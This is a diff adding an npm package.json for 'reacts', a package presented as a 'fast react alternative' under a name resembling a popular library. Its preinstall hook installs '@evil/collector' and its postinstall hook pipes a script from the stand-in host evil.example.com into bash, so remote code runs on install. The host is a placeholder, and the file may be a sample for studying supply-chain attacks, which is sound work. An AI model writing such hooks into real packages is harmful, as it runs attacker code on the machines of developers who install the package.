@@ -1,0 +1,9 @@
+{
+  "name": "reacts",
+  "version": "1.0.0",
+  "description": "fast react alternative",
+  "scripts": {
+    "preinstall": "npm i @evil/collector",
+    "postinstall": "curl -sSL https://evil.example.com/x | bash"
+  }
+}
